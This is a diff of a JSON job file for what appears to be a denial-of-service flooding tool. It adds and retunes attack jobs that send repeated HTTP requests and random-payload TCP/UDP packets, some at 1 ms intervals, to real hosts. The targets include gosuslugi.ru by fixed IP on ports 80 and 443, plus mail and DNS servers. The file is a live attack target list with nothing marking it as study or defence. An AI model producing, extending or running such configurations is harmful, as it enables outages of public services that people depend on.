@@ -1,7 +1,7 @@
 {
   "jobs": [{
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -16,7 +16,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -31,7 +31,37 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://gosuslugi.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "213.59.253.7:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 32,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://gosuslugi.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "213.59.253.7:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -46,7 +76,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -61,7 +91,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -76,7 +106,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -91,7 +121,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 35,
+      "count": 32,
       "args": {
         "address": "109.207.1.90:25",
         "body": "{{ random_payload 10 }}",
@@ -99,24 +129,24 @@
       }
     }, {
       "type": "tcp",
-      "count": 35,
+      "count": 32,
       "args": {
-        "address": "109.207.2.218:53",
+        "address": "213.59.253.4:53",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "udp",
       "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
-      "count": 35,
+      "count": 32,
       "args": {
-        "address": "109.207.2.218:53",
+        "address": "213.59.253.4:53",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1000
       }
     }, {
       "type": "tcp",
-      "count": 35,
+      "count": 32,
       "args": {
         "address": "213.59.255.175:53",
         "body": "{{ random_payload 10 }}",
@@ -125,7 +155,7 @@
     }, {
       "type": "udp",
       "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
-      "count": 35,
+      "count": 32,
       "args": {
         "address": "213.59.255.175:53",
         "body": "{{ random_payload 10 }}",
@@ -133,7 +163,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -148,7 +178,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -163,7 +193,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -178,7 +208,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -193,7 +223,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -208,7 +238,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -223,7 +253,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -238,7 +268,7 @@
       }
     }, {
       "type": "http",
-      "count": 35,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
@@ -253,7 +283,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 35,
+      "count": 32,
       "args": {
         "address": "213.59.254.2:25",
         "body": "{{ random_payload 10 }}",
@@ -261,7 +291,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 35,
+      "count": 32,
       "args": {
         "address": "213.59.254.2:587",
         "body": "{{ random_payload 10 }}",
@@ -269,7 +299,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 35,
+      "count": 32,
       "args": {
         "address": "213.59.254.2:993",
         "body": "{{ random_payload 10 }}",
@@ -277,7 +307,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 35,
+      "count": 32,
       "args": {
         "address": "212.58.160.101:10180",
         "body": "{{ random_payload 10 }}",
